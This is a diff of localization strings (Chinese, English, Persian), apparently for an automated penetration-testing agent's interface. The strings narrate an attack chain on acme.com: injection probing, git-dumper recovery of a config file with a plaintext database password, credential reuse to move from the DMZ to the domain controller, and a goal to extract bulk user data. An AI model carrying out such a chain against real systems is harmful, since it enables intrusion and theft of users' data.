+    "en": "data: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"Probe search?q= for injection.\"}}",
+    "fa": "data: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"search?q= را برای تزریق بررسی کن.\"}}"
+  },
+  "description 为必填项": {
+    "en": "description is required",
+    "fa": "description الزامی است"
+  },
+  "dmz-web01 第二网卡在 10.10.10.0/24，可从 DMZ 直达域控/文件服务器/Jenkins，越过网络分区。": {
+    "en": "dmz-web01's second NIC is on 10.10.10.0/24, so the domain controller, file server, and Jenkins are reachable directly from the DMZ, across the network zone.",
+    "fa": "کارت شبکه دوم dmz-web01 روی 10.10.10.0/24 است، پس از DMZ می‌توان مستقیم به کنترل‌کننده دامنه، سرور فایل و Jenkins رسید و از ناحیه شبکه عبور کرد."
+  },
+  "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法": {
+    "en": "echo '<jwt>' | cut -d. -f1 | base64 -d; # inspect the algorithm",
+    "fa": "echo '<jwt>' | cut -d. -f1 | base64 -d; # الگوریتم را ببینید"
+  },
+  "example.com\\n203.0.113.10\\n198.51.100.0/24\\n京ICP备12345678号-1\\n企业名称关键词": {
+    "en": "example.com\n203.0.113.10\n198.51.100.0/24\n京ICP备12345678号-1\nCompany name keyword",
+    "fa": "example.com\n203.0.113.10\n198.51.100.0/24\n京ICP备12345678号-1\nکلیدواژه نام سازمان"
+  },
+  "fa6 证据：ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(内网)；ping 10.10.10.10 通，跨越 DMZ 边界成立": {
+    "en": "fa6 evidence: ip a → eth0 10.0.20.15 (DMZ) / eth1 10.10.10.15 (internal); ping 10.10.10.10 succeeds, so the DMZ boundary is crossed",
+    "fa": "مدرک fa6: ip a → eth0 10.0.20.15 (DMZ) / eth1 10.10.10.15 (داخلی)؛ ping به 10.10.10.10 موفق است، پس عبور از مرز DMZ برقرار است"
+  },
+  "faGit 证据：git-dumper 还原出 config.php / db.php / order_api.php；config.php 内 $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']": {
+    "en": "faGit evidence: git-dumper recovered config.php / db.php / order_api.php; config.php contains $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
+    "fa": "مدرک faGit: git-dumper فایل‌های config.php / db.php / order_api.php را بازیابی کرد؛ داخل config.php این مقدار است: $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']"
+  },
+  "finding f-1 已记录": {
+    "en": "Finding f-1 recorded",
+    "fa": "یافته f-1 ثبت شد"
+  },
+  "finding f-2 已记录": {
+    "en": "Finding f-2 recorded",
+    "fa": "یافته f-2 ثبت شد"
+  },
+  "finding f-6 已记录，并连到目标 g1（proves）": {
+    "en": "Finding f-6 recorded and linked to goal g1 (proves)",
+    "fa": "یافته f-6 ثبت شد و به هدف g1 وصل شد (proves)"
+  },
+  "frontier 开放": {
+    "en": "Frontier open",
+    "fa": "frontier باز"
+  },
+  "frontier 待领": {
+    "en": "Frontier waiting to be claimed",
+    "fa": "frontier در انتظار دریافت"
+  },
+  "g1 达成（4/4 里已 met 3 个：g1/g3/g4）。g2 严守量化验收——只进后台不算，必须拿到批量用户数据才盖章；已把 i3/i5 提到 priority 9 并细化为取数意图，等 worker 回传即可收官整个任务。": {
+    "en": "g1 is met (3 of 4 are already met: g1/g3/g4). g2 keeps a quantitative bar — entering the admin panel is not enough; bulk user data is required before it is signed off. i3/i5 were raised to priority 9 and narrowed into data-extraction intents. The whole task can close once the worker reports back.",
+    "fa": "g1 محقق شد (از 4 مورد، 3 مورد همین حالا met هستند: g1/g3/g4). g2 معیار کمی را سخت نگه می‌دارد — ورود به پنل کافی نیست و تا داده دسته‌ای کاربران گرفته نشود تأیید نمی‌شود. i3/i5 به priority 9 رسیدند و به قصد استخراج داده دقیق شدند. با بازگشت نتیجه worker می‌توان کل وظیفه را بست."
+  },
+  "g2 量化核对：目标要求『读取用户敏感数据』=实际拿到批量用户记录。graph_overview 里 findings 尚无『成功导出用户数据』条目，i3/i5 均 running 未回取数结果——实测未达标。严禁以『后台已进、大体达成』提前标 met，继续派意图补足差距。": {
+    "en": "g2 quantitative check: the goal “read users' sensitive data” means actually obtaining bulk user records. graph_overview findings still have no “successfully exported user data” item, and i3/i5 are both running with no extraction result yet — the measurement is not met. Do not mark it met early because “the admin panel was entered and it is mostly done.” Keep dispatching intents to close the gap.",
+    "fa": "بررسی کمی g2: هدف «خواندن داده حساس کاربران» یعنی واقعاً رکوردهای دسته‌ای کاربران به دست آید. در findings مربوط به graph_overview هنوز مورد «خروجی موفق داده کاربران» نیست و i3/i5 هر دو running هستند و نتیجه استخراج نداده‌اند — در عمل به معیار نرسیده است. به این دلیل که «پنل باز شده و کار تقریباً انجام شده» آن را زودتر met نکنید. به فرستادن قصد ادامه دهید تا فاصله پر شود."
+  },
+  "g3 达成，攻击面从外网转入内网。已请登记 g4「内网横向，拿下内部靶标域控 DC01」，派 i9（主机发现）+ i10/i11/i12 三条并行横向。凭据复用直接锚在 faCreds 上——外网源码泄露的口令喂给内网横向。": {
+    "en": "g3 is met, and the attack surface has moved from the external network into the internal network. Please register g4 “internal lateral movement, own the internal target domain controller DC01”, and dispatch i9 (host discovery) plus three parallel lateral paths i10/i11/i12. Credential reuse is anchored on faCreds — passwords leaked from the external source are fed into internal lateral movement.",
+    "fa": "g3 محقق شد و سطح حمله از شبکه بیرونی به شبکه داخلی منتقل شده است. لطفاً g4 را ثبت کنید: «حرکت جانبی داخلی و گرفتن کنترل‌کننده دامنه هدف داخلی DC01»، و i9 (کشف میزبان) را به‌علاوه سه مسیر جانبی موازی i10/i11/i12 بفرستید. استفاده مجدد از اعتبارنامه به faCreds تکیه دارد — گذرواژه‌هایی که از کد منبع بیرونی لو رفته‌اند به حرکت جانبی داخلی داده می‌شوند."
+  },
+  "g4 收官，内外网链路完全打通（外网 RCE → DMZ → 内网 → 域控）。逐一比对未覆盖方向：g2「读取用户敏感数据」仍缺临门一脚，但现有 i3（后台用户接口）+ i5（API IDOR）已覆盖该方向、且都在 running。本轮无【本质不同的未覆盖新方向】——按克制原则 0 新意图，等 i3/i5 产出。": {
+    "en": "g4 is closed, and the path from outside to inside is fully connected (external RCE → DMZ → internal network → domain controller). Checking uncovered directions one by one: g2 “read users' sensitive data” is still one step short, but existing i3 (admin user API) and i5 (API IDOR) already cover that direction and both are running. This round has no materially different uncovered direction — under the restraint rule, 0 new intents. Wait for i3/i5 to produce results.",
+    "fa": "g4 بسته شد و مسیر بیرون تا داخل کاملاً وصل است (RCE بیرونی → DMZ → شبکه داخلی → کنترل‌کننده دامنه). جهت‌های پوشش‌داده‌نشده یکی‌یکی مقایسه شدند: g2 «خواندن داده حساس کاربران» هنوز یک گام آخر را کم دارد، اما i3 موجود (رابط کاربران پنل) و i5 (API IDOR) همین جهت را پوشش می‌دهند و هر دو running هستند. در این دور جهت تازه‌ای که ماهیتاً متفاوت و پوشش‌داده‌نشده باشد وجود ندارد — طبق اصل خویشتن‌داری 0 قصد جدید. منتظر نتیجه i3/i5 بمانید."
+  },
+  "git-dumper 还原 www.acme.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。": {
+    "en": "git-dumper recovered www.acme.com/.git and obtained config.php, which contains a plaintext DB password later confirmed reusable on the internal network.",
+    "fa": "git-dumper مسیر www.acme.com/.git را بازیابی کرد و config.php را به دست آورد. این فایل گذرواژه پایگاه داده را به‌صورت متن ساده دارد و بعداً مشخص شد در شبکه داخلی قابل استفاده مجدد است."
+  },
+  "goal g1 → met；剩余未达成：g2": {
+    "en": "goal g1 → met; still unmet: g2",
+    "fa": "goal g1 → met؛ هنوز محقق نشده: g2"
+  }
+}
